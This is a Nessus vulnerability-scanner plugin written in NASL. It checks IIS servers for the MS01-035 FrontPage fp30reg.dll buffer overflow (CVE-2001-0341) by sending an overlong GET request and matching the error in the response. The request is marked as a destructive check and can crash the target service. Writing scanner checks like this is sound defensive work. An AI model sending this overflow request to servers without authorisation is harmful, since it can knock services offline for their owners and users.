#
# This script was written by John Lampe <j_lampe@bellsouth.net>
#
# See the Nessus Scripts License for details
#

# Changes by Tenable:
# - Revised plugin title, changed family (2/04/09)
# - Title touch-up (9/18/09)
# - Title standardization (10/28/09)


include("compat.inc");

if(description)
{
 script_id(10699);
 script_version ("$Revision: 1.37 $");

 script_cve_id("CVE-2001-0341");
 script_bugtraq_id(2906);
 script_xref(name:"OSVDB", value:"577");

 script_name(english:"MS01-035: Microsoft IIS FrontPage fp30reg.dll Remote Overflow (uncredentialed check)");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is prone to a buffer overflow attack." );
 script_set_attribute(attribute:"description", value:
"Microsoft IIS, running Frontpage extensions, is vulnerable to a remote
buffer overflow attack.  An attacker, exploiting this bug, may gain
access to confidential data, critical business processes, and elevated
privileges on the attached network." );
 script_set_attribute(attribute:"see_also", value:"http://www.microsoft.com/technet/security/bulletin/MS01-035.mspx" );
 script_set_attribute(attribute:"solution", value:
"Install either SP4 for Windows 2000 or apply the fix described in
Microsoft Bulletin MS01-035." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();

 script_summary(english:"Attempts to overflow the fp30reg.dll dll");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2001-2009 John Lampe");
 script_family(english:"Web Servers");
 script_dependencie("find_service1.nasl", "http_version.nasl", "www_fingerprinting_hmap.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

sig = get_kb_item("www/hmap/" + port + "/description");
if ( sig && "IIS" >!< sig ) 
	exit(0);



#Make sure app is alive...
mystring = string("HEAD / HTTP/1.0\r\n\r\n");
if(get_port_state(port)) 
{
    mysoc = open_sock_tcp(port);
    if (! mysoc)
	exit(0);
    send(socket:mysoc, data:mystring);
    incoming = http_recv(socket:mysoc);
    if(!incoming) 
	exit(0);
    close(mysoc);
}


mystring= string ("GET /_vti_bin/_vti_aut/fp30reg.dll?" , crap(260), " HTTP/1.0\r\n\r\n");
if(get_port_state(port)) 
{
        mysoc = open_sock_tcp(port);
	if (! mysoc)
		exit(0);
        send(socket:mysoc, data:mystring);
        incoming=http_recv(socket:mysoc);
        match = egrep(pattern:".*The remote procedure call failed*" , string:incoming);
        if(match) 
		security_hole(port);
        close (mysoc);
}

